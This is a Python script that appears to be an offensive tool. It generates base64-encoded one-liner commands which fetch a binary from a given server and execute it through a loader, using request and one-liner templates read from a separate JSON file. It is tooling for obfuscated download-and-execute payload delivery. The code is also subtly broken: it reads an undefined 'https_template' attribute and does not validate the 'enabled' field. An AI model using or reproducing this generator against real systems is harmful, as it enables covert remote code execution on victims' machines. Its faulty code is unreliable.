#!/usr/bin/env python3
from base64 import b64decode as b64d
from base64 import b64encode as b64e
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
from urllib.parse import urlencode
import argparse
import json
import sys


@dataclass
class Template:
    name: str
    description: str
    http_template: List[str]
    enabled: bool
    oneliners: List[str]

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> Optional['Template']:
        required_fields = ['name', 'description', 'http_template', 'oneliners']
        missing = [f for f in required_fields if f not in data]
        if missing:
            raise ValueError(f"Template missing required fields: {', '.join(missing)}")

        if data.get('enabled') is False:
            return None  

        return cls(
            name=data['name'],
            description=data['description'],
            http_template=data['http_template'],
            enabled=data['enabled'],
            oneliners=data['oneliners']
        )


@dataclass
class TemplateConfig:
    scheme: str = field(init=False)
    host: str = field(init=False)
    port: Optional[int] = field(init=False)
    path: str = field(init=False)
    args: str = ""
  
    def __init__(self, url: str, binary: str, args: Optional[str] = ""):
        try:
            parsed_url = urlparse(url if "://" in url else f"http://{url}")
            
            allowed_schemes = {"http", "https"}
            
            if parsed_url.scheme not in allowed_schemes:
                raise ValueError(
                    f"Invalid URL scheme: '{parsed_url.scheme}'.\n"
                    f"➡ Allowed schemes: {', '.join(allowed_schemes)}"
                )
            
            self.scheme = parsed_url.scheme
            self.host = '127.0.0.1' if parsed_url.hostname in ['localhost'] else parsed_url.hostname
            self.port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == "https" else 80)
            self.path = f"/{binary}"
            self.args = args
        except ValueError as e:
            print(e)
            sys.exit(1)


class FetcherGenerator():
    def __init__(self, template: Template, config: TemplateConfig):
        self.template: Template = template
        self.config: TemplateConfig = config
        self.oneliners: List[str] = []
        
    def generate_command(self, decode: bool = False):
        """Generate a command for the given fetcher type"""
        template = (
            "\n".join(self.template.https_template)
            if self.config.scheme == "https"
            else "\n".join(self.template.http_template)
        )
        
        data = urlencode({'args': self.config.args})
        content_length = len(data)
        
        replacements = {
            '{{HOST}}': self.config.host,
            '{{PORT}}': str(self.config.port),
            '{{PATH}}': self.config.path,
            '{{DATA}}': data,
            '{{CONTENT_LENGTH}}': str(content_length)
        }
        
        template = self._apply_replacements(template, replacements)
        
        template_encoded = b64e(template.encode()).decode()
        template_decoded = b64d(template_encoded.encode()).decode()
        
        
        if decode:
            return template_decoded
        
        cmd_replacements = {
            '{{COMMAND_ENC}}': template_encoded,
            '{{COMMAND_DEC}}': self._generate_oneliner(template_decoded)
        }
        
        self.oneliners = [self._apply_replacements(i, cmd_replacements) for i in self.template.oneliners]
        return self.oneliners
    
    def _generate_oneliner(self, command: str):
        return "; ".join(line.strip() for line in command.splitlines() if line.strip() and not line.startswith("#"))
    
    def _apply_replacements(self, template, replacements):
        for old, new in replacements.items():
            template = template.replace(old, new)
        return template


def show_templates(templates: List[Template]):
    for template in templates:
        name = template.name
        desc = template.description
        print(f"{'=' * 50}\n[ {name} ]\n> {desc}\n")
        
def main():
    arg_parser = argparse.ArgumentParser(
        description="Generate base64-encoded commands for binary execution via Python loader",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    subparsers = arg_parser.add_subparsers(dest="command", required=True)

    # `templates` Subcommand
    list_parser = subparsers.add_parser("templates", help="List available templates")

    # `generate` Subcommand
    generate_parser = subparsers.add_parser("generate", help="Generate a base64-encoded loader command")
    generate_parser.add_argument("template", type=str, help="Template to use for generating the command")
    generate_parser.add_argument("server", type=str, help="Server URL to fetch binary from")
    generate_parser.add_argument("binary", type=str, help="Binary to fetch from the server")
    generate_parser.add_argument("-a", "--args", type=str, default="", help="Arguments to pass to the binary")
    generate_parser.add_argument("-d", "--decode", action="store_true", help="Print decoded command (for debugging)")
    generate_parser.add_argument("-T", "--template-file", type=str, default="templates.json", help="Path to fetchers template file")
    
    args = arg_parser.parse_args()

    with open(args.template_file, 'r') as f:
        templates = [t for _, data in json.load(f).items() if (t := Template.from_dict(data)) is not None]

    if args.command == "templates":
        show_templates(templates)
    
    elif args.command == "generate":
        if not (template := next((t for t in templates if t.name == args.template), None)):
            print(f"Error: Template for '{args.template}' not found.", file=sys.stderr)
            sys.exit(1)
        
        config = TemplateConfig(args.server, args.binary, args.args)
                
        fg = FetcherGenerator(template, config)
        
        if args.decode:
            print(fg.generate_command(decode=True))
        else:
            for idx, oneliner in enumerate(fg.generate_command(), start=1):
                print(f"[Option {idx}]\n{oneliner}\n")
        

if __name__ == "__main__":
    main()
